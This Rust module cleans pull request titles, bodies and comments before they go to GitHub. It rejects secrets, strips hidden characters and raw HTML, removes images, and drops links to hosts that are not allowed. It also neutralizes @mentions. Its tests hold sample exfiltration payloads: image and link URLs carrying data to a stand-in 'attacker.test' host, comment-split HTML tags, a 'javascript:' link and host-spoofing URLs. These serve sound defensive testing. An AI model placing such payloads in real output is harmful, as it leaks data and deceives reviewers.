//! Text on its way to GitHub: checked for secrets, then made safe to render.
//!
//! `policies/security.yaml`: the sink `github_bound_text` blocks (a secret in text bound for
//! GitHub stops the call, nothing is sent, because silent redaction would change what a person
//! reviews), and `output_hygiene` says what a rendered body may carry:
//!
//! * no raw HTML (a `<` that starts a tag, a comment, a declaration or a processing instruction is
//!   written as `&lt;`), and no HTML comments at all,
//! * no hidden content: zero-width characters, bidirectional controls and control characters,
//! * no image (GitHub fetches images, so an image URL is a way to carry data out),
//! * no link to a domain that is not on `allow_link_domains` (default `github.com`): a Markdown
//!   link keeps its words and loses its URL, a bare URL is replaced by `(link removed)`,
//! * no active `@mention` and no cross-repository reference (`owner/repo#12`): each is written in a
//!   code span,
//! * at most `max_body_bytes`.
//!
//! The rules are applied to the whole text without trying to understand fences or the block
//! structure of the Markdown. Two parsers that disagree about where a block ends are a way around a
//! filter, so the filter does not rely on knowing. The cost is that a `<` that starts a tag inside a
//! code block shows as `&lt;`, and that a mention inside a code block is written in a code span of
//! its own. A body that is already clean is returned unchanged, and cleaning twice gives the same
//! result.
//!
//! # Mentions and the backtick
//!
//! A mention or a reference is left alone only when it sits inside a code span that opens and
//! closes on the same line (see `code_span_flags`), read the way CommonMark reads backtick strings:
//! a string of `n` backticks opens a span that the next string of exactly `n` backticks closes, a
//! backslash escapes a backtick outside a span, and a string that finds no partner is plain text. A
//! lone backtick therefore protects nothing (AUT-7). A span that holds a pipe is not trusted either,
//! because a table row is split at its pipes before spans are read. Every other mention is written
//! in a span whose backtick string has a length no other string in the text has, so no backtick that
//! is already there can pair with it, and it is set apart by a space from a backtick or a backslash
//! next to it, so it cannot merge with one.
//!
//! UNVERIFIED against GitHub's renderer: the filter was written from the CommonMark and GFM rules
//! and tested with the vectors of NT-SEC-04, not by rendering text on GitHub.

use std::sync::Arc;

use factory_domain::redaction::Redactor;
use factory_ports::githost::{GitHostError, Rejection};

/// What the outbound text rules are set to.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutboundPolicy {
    /// Hosts a link may point to (`output_hygiene.allow_link_domains`). A subdomain of a listed
    /// host is allowed.
    pub link_domains: Vec<String>,
    /// The longest body, in bytes (`output_hygiene.max_body_bytes`).
    pub max_body_bytes: usize,
}

impl Default for OutboundPolicy {
    fn default() -> Self {
        Self {
            link_domains: vec!["github.com".to_owned()],
            max_body_bytes: 60_000,
        }
    }
}

/// The kinds of text the adapter writes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum TextKind {
    /// A pull request title: one line of plain text.
    Title,
    /// A pull request body, a comment or a check summary: Markdown.
    Markdown,
}

/// Checks and cleans outbound text.
pub(crate) struct Outbound {
    redactor: Arc<Redactor>,
    policy: OutboundPolicy,
}

impl Outbound {
    pub(crate) fn new(redactor: Arc<Redactor>, policy: OutboundPolicy) -> Self {
        Self { redactor, policy }
    }

    /// `UnsafeText` when the text holds a secret or the redactor could not decide. Cheap enough to
    /// run on branch names too.
    pub(crate) fn guard(&self, text: &str) -> Result<(), GitHostError> {
        match self.redactor.contains_secret(text.as_bytes()) {
            Ok(false) => Ok(()),
            // A secret, or a redactor that failed: the content is dropped either way.
            Ok(true) | Err(_) => Err(GitHostError::UnsafeText),
        }
    }

    /// The text to send, or an error and nothing sent. The secret check runs on the text as
    /// given and again on the cleaned text.
    pub(crate) fn prepare(&self, kind: TextKind, text: &str) -> Result<String, GitHostError> {
        self.guard(text)?;
        let cleaned = match kind {
            TextKind::Title => clean_title(text),
            TextKind::Markdown => clean_markdown(text, &self.policy.link_domains),
        };
        self.guard(&cleaned)?;
        if cleaned.trim().is_empty() || cleaned.len() > self.policy.max_body_bytes {
            return Err(GitHostError::Rejected(Rejection::TextBounds));
        }
        Ok(cleaned)
    }

    /// Checks that a link is on the allowed list. For the `details_url` of a check run.
    pub(crate) fn link_is_allowed(&self, url: &str) -> bool {
        host_allowed(url, &self.policy.link_domains)
    }
}

const TITLE_LIMIT: usize = 256;

/// Zero-width, bidirectional and control characters. A newline and a tab are kept elsewhere; this
/// says which characters are never visible content.
fn is_hidden(c: char) -> bool {
    matches!(
        c,
        '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{2069}'
            | '\u{061c}'
            | '\u{feff}'
            | '\u{00ad}'
            | '\u{180e}'
    )
}

fn clean_title(text: &str) -> String {
    let line: String = text
        .chars()
        .filter(|c| !is_hidden(*c))
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let mut title = line.trim().to_owned();
    if title.len() > TITLE_LIMIT {
        let mut cut = TITLE_LIMIT;
        while !title.is_char_boundary(cut) {
            cut -= 1;
        }
        title.truncate(cut);
    }
    title
}

/// Pass A: remove hidden characters, control characters other than newline and tab, and HTML
/// comments. An unterminated comment removes the rest of the text.
fn strip_hidden(text: &str) -> String {
    let normalized = text.replace("\r\n", "\n").replace('\r', "\n");
    let mut out = String::with_capacity(normalized.len());
    let mut rest = normalized.as_str();
    while let Some(start) = rest.find("<!--") {
        out.push_str(rest.get(..start).unwrap_or_default());
        match rest
            .get(start + 4..)
            .and_then(|after| after.find("-->").map(|end| (after, end)))
        {
            Some((after, end)) => rest = after.get(end + 3..).unwrap_or_default(),
            None => {
                rest = "";
            }
        }
    }
    out.push_str(rest);
    out.chars()
        .filter(|c| !is_hidden(*c) && (!c.is_control() || *c == '\n' || *c == '\t'))
        .collect()
}

/// Pass A2: a `<` that begins a tag, a closing tag, a declaration or a processing instruction
/// becomes `&lt;`. Removing a comment can join two halves of a tag, so this runs after it.
fn escape_html(text: &str) -> String {
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    for (index, c) in chars.iter().enumerate() {
        let starts_markup = *c == '<'
            && chars
                .get(index + 1)
                .is_some_and(|n| n.is_ascii_alphabetic() || matches!(n, '/' | '!' | '?'));
        if starts_markup {
            out.push_str("&lt;");
        } else {
            out.push(*c);
        }
    }
    out
}

/// The index just after the bracket that closes the one at `open`, counting nested brackets and
/// skipping escaped ones.
fn closing(chars: &[char], open: usize, left: char, right: char) -> Option<usize> {
    let mut depth = 0_usize;
    let mut index = open;
    while let Some(c) = chars.get(index) {
        if *c == '\\' {
            index += 2;
            continue;
        }
        if *c == left {
            depth += 1;
        } else if *c == right {
            depth = depth.checked_sub(1)?;
            if depth == 0 {
                return Some(index + 1);
            }
        }
        index += 1;
    }
    None
}

/// Pass B: images disappear, links keep their words unless they point to an allowed host, and
/// reference definitions are dropped.
fn neutralize_links(text: &str, domains: &[String]) -> String {
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut index = 0;
    while let Some(c) = chars.get(index).copied() {
        let image = c == '!' && chars.get(index + 1) == Some(&'[');
        if c == '[' || image {
            let open = if image { index + 1 } else { index };
            if let Some(after_label) = closing(&chars, open, '[', ']') {
                let label: String = chars
                    .get(open + 1..after_label - 1)
                    .unwrap_or_default()
                    .iter()
                    .collect();
                let (end, url) = match chars.get(after_label) {
                    Some('(') => {
                        closing(&chars, after_label, '(', ')').map_or((after_label, None), |e| {
                            let inner: String = chars
                                .get(after_label + 1..e - 1)
                                .unwrap_or_default()
                                .iter()
                                .collect();
                            (e, Some(inner))
                        })
                    }
                    Some('[') => closing(&chars, after_label, '[', ']')
                        .map_or((after_label, None), |e| (e, Some(String::new()))),
                    _ => (after_label, None),
                };
                if image {
                    out.push_str("(image removed)");
                    index = end;
                    continue;
                }
                if let Some(url) = url {
                    let destination = url.split_whitespace().next().unwrap_or("");
                    let words = neutralize_links(&label, domains);
                    if host_allowed(destination, domains) {
                        // The label is cleaned like any other text: an image in it is removed
                        // (AUT-6). The title is dropped; only the address is kept, as it was
                        // checked.
                        out.push('[');
                        out.push_str(&words);
                        out.push_str("](");
                        out.push_str(destination);
                        out.push(')');
                    } else {
                        out.push_str(&words);
                    }
                    index = end;
                    continue;
                }
            }
        }
        out.push(c);
        index += 1;
    }
    drop_definitions(&out)
}

/// True when the line starts a link reference definition, `[label]: destination`, once the
/// markers of the containers around it are removed: a block quote (`>`) or a list item (`-`, `*`,
/// `+`, `1.` or `1)`), each of them up to three spaces in. A definition in a quote or a list item is
/// as much a definition as one at the left margin (AUT-6).
fn is_definition(line: &str) -> bool {
    let mut rest = line;
    for _ in 0..16 {
        let trimmed = rest.trim_start_matches(' ');
        if rest.len() - trimmed.len() > 3 {
            return false;
        }
        if let Some(after) = trimmed.strip_prefix('>') {
            rest = after;
            continue;
        }
        let bullet = trimmed.strip_prefix(['-', '*', '+']);
        let digits = trimmed.trim_start_matches(|c: char| c.is_ascii_digit());
        let numbered = (trimmed.len() > digits.len() && trimmed.len() - digits.len() <= 9)
            .then(|| digits.strip_prefix(['.', ')']))
            .flatten();
        if let Some(after) = bullet.or(numbered).filter(|after| after.starts_with(' ')) {
            rest = after;
            continue;
        }
        return trimmed.starts_with('[') && trimmed.find("]:").is_some_and(|at| at > 1);
    }
    false
}

/// Removes lines of the form `[label]: destination`, also inside block quotes and list items.
fn drop_definitions(text: &str) -> String {
    text.split('\n')
        .filter(|line| !is_definition(line))
        .collect::<Vec<_>>()
        .join("\n")
}

/// The host of a URL, lower case, without port or user information. `None` when there is no
/// `http` or `https` scheme.
fn host_of(url: &str) -> Option<String> {
    let lower = url.to_ascii_lowercase();
    let rest = lower
        .strip_prefix("https://")
        .or_else(|| lower.strip_prefix("http://"))?;
    // A browser ends the host at a backslash like it does at a slash, for the `http` and `https`
    // schemes: `https://attacker.test\.github.com/x` goes to `attacker.test` (RR-19). So the
    // authority ends there too.
    let authority = rest.split(['/', '\\', '?', '#']).next().unwrap_or_default();
    // A user-information part is a way to put one host before the real one, and anything else that
    // is not part of a name, a port or an address makes the authority one this filter does not read
    // the way a browser does: the host is then unknown and the link is not kept.
    if !authority
        .bytes()
        .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b':'))
    {
        return None;
    }
    let host = authority.split(':').next().unwrap_or_default();
    (!host.is_empty()).then(|| host.to_owned())
}

fn host_allowed(url: &str, domains: &[String]) -> bool {
    let secure = url.len() >= 8
        && url
            .get(..8)
            .is_some_and(|p| p.eq_ignore_ascii_case("https://"));
    secure
        && host_of(url).is_some_and(|host| {
            domains
                .iter()
                .any(|d| host == *d || host.ends_with(&format!(".{d}")))
        })
}

fn is_word(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-')
}

/// A character that makes an `@` after it part of a word (an address such as `a@b`) and so not the
/// start of a mention. A hyphen is not one: GitHub starts a mention after a hyphen, so `x-@name`
/// notifies `name` (RR-20).
fn glues_an_at_sign(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

/// The number of backticks in the string that starts at `from`.
fn backtick_run(chars: &[char], from: usize) -> usize {
    chars
        .get(from..)
        .unwrap_or_default()
        .iter()
        .take_while(|c| **c == '`')
        .count()
}

/// The start of the next backtick string of exactly `length` backticks at or after `from`.
fn closing_run(chars: &[char], from: usize, length: usize) -> Option<usize> {
    let mut index = from;
    while index < chars.len() {
        if chars.get(index) == Some(&'`') {
            let run = backtick_run(chars, index);
            if run == length {
                return Some(index);
            }
            index += run;
        } else {
            index += 1;
        }
    }
    None
}

/// Marks the characters of one line that sit inside a code span, delimiters included.
fn mark_spans(line: &[char], flags: &mut [bool]) {
    let mut index = 0;
    while index < line.len() {
        match line.get(index) {
            // Outside a span a backslash escapes the punctuation after it, a backtick included.
            Some('\\') if line.get(index + 1).is_some_and(char::is_ascii_punctuation) => {
                index += 2;
            }
            Some('`') => {
                let length = backtick_run(line, index);
                let content = index + length;
                match closing_run(line, content, length) {
                    // A table row is cut at its pipes before spans are read, so a span with a pipe
                    // in it may not be a span at all.
                    Some(close) if !line.get(content..close).unwrap_or_default().contains(&'|') => {
                        if let Some(span) = flags.get_mut(index..close + length) {
                            span.fill(true);
                        }
                        index = close + length;
                    }
                    _ => index = content,
                }
            }
            _ => index += 1,
        }
    }
}

/// For every character of `chars`: true when it is inside a code span that opens and closes on its
/// line. A span that runs over several lines is not trusted, which makes a mention in one get a span
/// of its own: the cost is a few backticks, and the gain is that no block structure has to be
/// guessed.
fn code_span_flags(chars: &[char]) -> Vec<bool> {
    let mut flags = vec![false; chars.len()];
    let mut start = 0;
    while start <= chars.len() {
        let end = chars
            .get(start..)
            .and_then(|rest| rest.iter().position(|c| *c == '\n'))
            .map_or(chars.len(), |at| start + at);
        if let (Some(line), Some(marks)) = (chars.get(start..end), flags.get_mut(start..end)) {
            mark_spans(line, marks);
        }
        start = end + 1;
    }
    flags
}

/// The length of the backtick string for the spans this pass writes: the smallest length that no
/// backtick string in the text has, so that none of them can pair with one of ours.
fn own_delimiter_length(chars: &[char]) -> usize {
    let mut taken = std::collections::BTreeSet::new();
    let mut index = 0;
    while index < chars.len() {
        if chars.get(index) == Some(&'`') {
            let run = backtick_run(chars, index);
            taken.insert(run);
            // A backslash in front of the string escapes its first backtick, so the string that
            // is left is one shorter.
            if index > 0 && chars.get(index - 1) == Some(&'\\') && run > 1 {
                taken.insert(run - 1);
            }
            index += run;
        } else {
            index += 1;
        }
    }
    (1..).find(|length| !taken.contains(length)).unwrap_or(1)
}

/// Writes `content` in a code span, set apart from what is next to it.
fn push_code_span(out: &mut String, content: &str, delimiter: usize, next: Option<char>) {
    if out.ends_with(['`', '\\']) {
        out.push(' ');
    }
    let fence = "`".repeat(delimiter);
    out.push_str(&fence);
    out.push_str(content);
    out.push_str(&fence);
    if next == Some('`') {
        out.push(' ');
    }
}

/// Pass C: bare URLs, `@mentions` and `owner/repo#N` references, in one scan.
fn neutralize_tokens(text: &str, domains: &[String]) -> String {
    let chars: Vec<char> = text.chars().collect();
    let in_span = code_span_flags(&chars);
    let delimiter = own_delimiter_length(&chars);
    let mut out = String::with_capacity(text.len());
    let mut index = 0;
    while let Some(c) = chars.get(index).copied() {
        let previous = index.checked_sub(1).and_then(|i| chars.get(i)).copied();
        let at_boundary = previous.is_none_or(|p| !p.is_ascii_alphanumeric());
        let protected = in_span.get(index).copied().unwrap_or(false);
        let rest: String = chars
            .get(index..(index + 8).min(chars.len()))
            .unwrap_or_default()
            .iter()
            .collect();
        let lower = rest.to_ascii_lowercase();
        if at_boundary
            && (lower.starts_with("http://")
                || lower.starts_with("https://")
                || lower.starts_with("www."))
        {
            let end = chars
                .iter()
                .enumerate()
                .skip(index)
                .find(|(_, ch)| ch.is_whitespace() || matches!(ch, '<' | '>' | '"' | '\'' | '`'))
                .map_or(chars.len(), |(i, _)| i);
            let url: String = chars.get(index..end).unwrap_or_default().iter().collect();
            // Trailing punctuation belongs to the sentence, not to the URL.
            let trimmed = url.trim_end_matches(['.', ',', ';', ':', ')', ']', '!', '?']);
            if host_allowed(trimmed, domains) {
                out.push_str(trimmed);
            } else {
                out.push_str("(link removed)");
            }
            out.push_str(url.get(trimmed.len()..).unwrap_or_default());
            index = end;
            continue;
        }
        if c == '@'
            && !protected
            && previous.is_none_or(|p| !glues_an_at_sign(p) && p != '@')
            && chars
                .get(index + 1)
                .is_some_and(|n| n.is_ascii_alphanumeric())
        {
            let mut end = index + 1;
            while chars.get(end).is_some_and(|ch| is_word(*ch) || *ch == '/') {
                end += 1;
            }
            let name: String = chars.get(index..end).unwrap_or_default().iter().collect();
            push_code_span(&mut out, &name, delimiter, chars.get(end).copied());
            index = end;
            continue;
        }
        if at_boundary
            && !protected
            && c.is_ascii_alphanumeric()
            && let Some(end) = cross_repository_reference(&chars, index)
        {
            let reference: String = chars.get(index..end).unwrap_or_default().iter().collect();
            push_code_span(&mut out, &reference, delimiter, chars.get(end).copied());
            index = end;
            continue;
        }
        out.push(c);
        index += 1;
    }
    out
}

/// The end of an `owner/repo#12` reference that starts at `start`, if there is one.
fn cross_repository_reference(chars: &[char], start: usize) -> Option<usize> {
    let part = |from: usize| {
        let mut end = from;
        while chars
            .get(end)
            .is_some_and(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
        {
            end += 1;
        }
        end
    };
    let owner_end = part(start);
    (owner_end > start && chars.get(owner_end) == Some(&'/')).then_some(())?;
    let repo_end = part(owner_end + 1);
    (repo_end > owner_end + 1 && chars.get(repo_end) == Some(&'#')).then_some(())?;
    let mut number_end = repo_end + 1;
    while chars.get(number_end).is_some_and(char::is_ascii_digit) {
        number_end += 1;
    }
    (number_end > repo_end + 1).then_some(number_end)
}

fn clean_markdown(text: &str, domains: &[String]) -> String {
    let stripped = strip_hidden(text);
    let escaped = escape_html(&stripped);
    let linked = neutralize_links(&escaped, domains);
    neutralize_tokens(&linked, domains)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(text: &str) -> String {
        clean_markdown(text, &["github.com".to_owned()])
    }

    #[test]
    fn plain_prose_is_returned_unchanged() {
        let text = "Validation passed.\n\n- the build ran\n- 12 tests passed (see below)\n\n```\nlet a = b < c;\n```\n";
        assert_eq!(clean(text), text);
    }

    #[test]
    fn images_are_removed_in_every_form() {
        for text in [
            "![x](https://attacker.test/?d=SECRET)",
            "![x][ref]\n\n[ref]: https://attacker.test/?d=SECRET",
            "![x]",
            "![](https://attacker.test/a.png \"title\")",
        ] {
            let cleaned = clean(text);
            assert!(
                !cleaned.contains("attacker.test"),
                "{text:?} -> {cleaned:?}"
            );
            assert!(cleaned.contains("(image removed)"), "{cleaned:?}");
        }
    }

    #[test]
    fn raw_html_and_comments_cannot_survive() {
        let cleaned = clean(
            "<img src=\"https://attacker.test/x\"> <a href=\"https://attacker.test\">go</a> <!-- hidden: SECRET --> ok",
        );
        assert!(
            !cleaned.contains("<img") && !cleaned.contains("<a "),
            "{cleaned:?}"
        );
        assert!(
            !cleaned.contains("attacker.test") && !cleaned.contains("hidden"),
            "{cleaned:?}"
        );
        assert!(cleaned.ends_with("ok"), "{cleaned:?}");
        assert_eq!(clean("a <!-- never closed SECRET"), "a ");
    }

    #[test]
    fn a_comment_cannot_be_used_to_join_the_halves_of_a_tag() {
        let cleaned = clean("<im<!-- x -->g src=https://attacker.test/x>");
        assert!(!cleaned.contains("<img"), "{cleaned:?}");
        assert!(!cleaned.contains("attacker.test"), "{cleaned:?}");
    }

    #[test]
    fn links_to_other_hosts_keep_their_words_and_lose_their_address() {
        let cleaned = clean(
            "[click here](https://attacker.test/?d=SECRET) and [ref one][r1] and <https://attacker.test/a>\n\n[r1]: https://attacker.test/b",
        );
        assert!(!cleaned.contains("attacker.test"), "{cleaned:?}");
        assert!(
            cleaned.contains("click here") && cleaned.contains("ref one"),
            "{cleaned:?}"
        );
        let script = clean("[x](javascript:alert(1))");
        assert_eq!(script, "x");
    }

    #[test]
    fn a_link_to_an_allowed_host_over_https_is_kept() {
        let kept = "[the run](https://github.com/example-org/fixture/actions/runs/1)";
        assert_eq!(clean(kept), kept);
        for lookalike in [
            "[x](https://github.com.evil.test/a)",
            "[x](http://github.com/a)",
            "[x](https://evil.test/github.com)",
            "[x](https://github.com@evil.test/a)",
        ] {
            assert_eq!(clean(lookalike), "x", "{lookalike}");
        }
    }

    #[test]
    fn bare_urls_to_other_hosts_are_replaced_and_allowed_ones_are_kept() {
        assert_eq!(
            clean("see https://attacker.test/?d=SECRET. and www.attacker.test/x"),
            "see (link removed). and (link removed)"
        );
        assert_eq!(
            clean("see https://github.com/example-org/fixture/pull/3."),
            "see https://github.com/example-org/fixture/pull/3."
        );
    }

    #[test]
    fn mentions_and_cross_repository_references_are_written_in_code_spans() {
        assert_eq!(
            clean("ping @octocat and @org/team, see other/repo#12 and here#3"),
            "ping `@octocat` and `@org/team`, see `other/repo#12` and here#3"
        );
        assert_eq!(clean("mail me@example.com"), "mail me@example.com");
        assert_eq!(clean("already `@octocat` here"), "already `@octocat` here");
    }

    #[test]
    fn many_mentions_are_all_neutralized() {
        let text: String = (0..50).map(|i| format!("@user{i} ")).collect();
        let cleaned = clean(&text);
        assert_eq!(cleaned.matches('`').count(), 100);
        assert!(!cleaned.contains(" @"), "{cleaned:?}");
    }

    #[test]
    fn hidden_characters_are_removed() {
        assert_eq!(clean("a\u{200b}b\u{202e}c\u{feff}d\u{0}e"), "abcde");
        assert_eq!(
            clean("line one\r\nline two\rline three"),
            "line one\nline two\nline three"
        );
    }

    #[test]
    fn cleaning_twice_gives_the_same_text() {
        let hostile = "![x](https://a.test/?d=1) [y](https://b.test) @alice other/repo#9 <b>bold</b> https://c.test/z <!-- c --> [r]: https://d.test\n[r]: https://e.test";
        let once = clean(hostile);
        assert_eq!(clean(&once), once);
    }

    /// What a reader of CommonMark would see outside every code span, with the spans read over a
    /// whole paragraph (a looser reading than the filter's, which trusts a span only on one line).
    /// An independent check: it shares no code with the filter.
    fn outside_code_spans(text: &str) -> String {
        let mut shown = String::new();
        for paragraph in text.split("\n\n") {
            let chars: Vec<char> = paragraph.chars().collect();
            let mut index = 0;
            while index < chars.len() {
                let c = chars[index];
                if c == '\\' && chars.get(index + 1).is_some_and(char::is_ascii_punctuation) {
                    shown.push(c);
                    shown.push(chars[index + 1]);
                    index += 2;
                } else if c == '`' {
                    let run = chars[index..].iter().take_while(|x| **x == '`').count();
                    let mut search = index + run;
                    let mut close = None;
                    while search < chars.len() {
                        if chars[search] == '`' {
                            let other = chars[search..].iter().take_while(|x| **x == '`').count();
                            if other == run {
                                close = Some(search + other);
                                break;
                            }
                            search += other;
                        } else {
                            search += 1;
                        }
                    }
                    match close {
                        Some(end) => {
                            shown.push(' ');
                            index = end;
                        }
                        None => {
                            shown.extend(std::iter::repeat_n('`', run));
                            index += run;
                        }
                    }
                } else {
                    shown.push(c);
                    index += 1;
                }
            }
            shown.push_str("\n\n");
        }
        shown
    }

    fn assert_inert(text: &str) {
        let cleaned = clean(text);
        let shown = outside_code_spans(&cleaned);
        assert!(
            !shown.contains('@'),
            "{text:?} -> {cleaned:?} leaves a mention outside a code span: {shown:?}"
        );
        assert!(
            !shown.contains("victim/repo#"),
            "{text:?} -> {cleaned:?} leaves a reference outside a code span: {shown:?}"
        );
        assert_eq!(clean(&cleaned), cleaned, "{text:?}: cleaning twice differs");
    }

    #[test]
    fn a_backtick_that_closes_nothing_protects_no_mention_and_no_reference() {
        for text in [
            "Please look, `@example-org/security-team now",
            "See `victim/repo#12 for details",
            "``@a`",
            "`@a``",
            "\\`@a`",
            "```@a",
            "x `` y `@a z",
            "line `\n@team `",
            "# heading `\n@team `",
            "```\n`\n```\n@team `",
            "| `@x | y` |",
            "`one` and `@team",
            "`a` `@b` `@c",
            "`@a` and `` ` `` and `@b",
            "`` `@a` ",
            "text `@a`@b",
            "`victim/repo#12",
            "@a`@b`@c`",
            "``@a`` `@b",
        ] {
            assert_inert(text);
        }
    }

    #[test]
    fn our_own_span_cannot_pair_with_a_backtick_that_is_already_there() {
        // The text uses the lengths 1, 2 and 3, so the span is made with 4.
        let cleaned = clean("` `` ``` @a");
        assert!(cleaned.contains("````@a````"), "{cleaned:?}");
        // A backtick next to the mention is set apart from the span by a space.
        let cleaned = clean("`@a");
        assert_eq!(cleaned, "` ``@a``");
        assert_eq!(clean("@a`"), "``@a`` `");
        assert_eq!(clean("\\@a"), "\\ `@a`");
    }

    #[test]
    fn a_mention_inside_a_span_that_closes_on_its_line_is_left_alone() {
        for text in [
            "already `@octocat` here",
            "`victim/repo#12` is fine",
            "`` `@a` ``",
            "a `x` and `@b` and `y`",
        ] {
            assert_eq!(clean(text), text);
        }
        // A span with a pipe in it is not trusted: a table row is cut at its pipes first.
        let cleaned = clean("| `@x | y` |");
        assert!(cleaned.contains("``@x``"), "{cleaned:?}");
    }

    #[test]
    fn an_image_inside_a_link_to_an_allowed_host_is_removed() {
        let cleaned =
            clean("[![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture)");
        assert_eq!(
            cleaned,
            "[(image removed)](https://github.com/example-org/fixture)"
        );
        let nested = clean(
            "[a [![x](//attacker.test/i.png)](https://github.com/o/r) b](https://github.com/o/r)",
        );
        assert!(!nested.contains("attacker.test"), "{nested:?}");
        assert!(!nested.contains("!["), "{nested:?}");
        // A title is dropped, because it can hold anything.
        let titled = clean("[x](https://github.com/o/r \"![i](//attacker.test/x)\")");
        assert_eq!(titled, "[x](https://github.com/o/r)");
    }

    #[test]
    fn a_definition_in_a_quote_or_a_list_item_is_dropped() {
        for text in [
            "[![chart][r]](https://github.com/o/r)\n\n> [r]: //attacker.test/b.png",
            "![x][r]\n\n> > [r]: //attacker.test/b.png",
            "![x][r]\n\n- [r]: //attacker.test/b.png",
            "![x][r]\n\n1. [r]: //attacker.test/b.png",
            "![x][r]\n\n   > - [r]: //attacker.test/b.png",
        ] {
            let cleaned = clean(text);
            assert!(
                !cleaned.contains("attacker.test"),
                "{text:?} -> {cleaned:?}"
            );
            assert!(!cleaned.contains("]: "), "{text:?} -> {cleaned:?}");
        }
        // A line that only looks like one is kept.
        assert_eq!(clean("a [note]: here"), "a [note]: here");
        assert_eq!(clean("    [code]: indented"), "    [code]: indented");
    }

    #[test]
    fn a_title_is_one_line_of_plain_text() {
        assert_eq!(
            clean_title("  Add a\nword\tcount\u{200b} command  "),
            "Add a word count command"
        );
        assert!(clean_title(&"x".repeat(1000)).len() <= TITLE_LIMIT);
    }

    #[test]
    fn host_matching_ignores_case_and_refuses_user_information() {
        let domains = vec!["github.com".to_owned()];
        assert!(host_allowed("https://GitHub.com/x", &domains));
        assert!(host_allowed("https://gist.github.com/x", &domains));
        // A host name followed by a user and a password before the real host, written in pieces.
        let with_user_information = ["https://github.com", ":", "x", "@attacker.test/x"].concat();
        assert!(!host_allowed(&with_user_information, &domains));
        assert!(!host_allowed("ftp://github.com/x", &domains));
    }
}
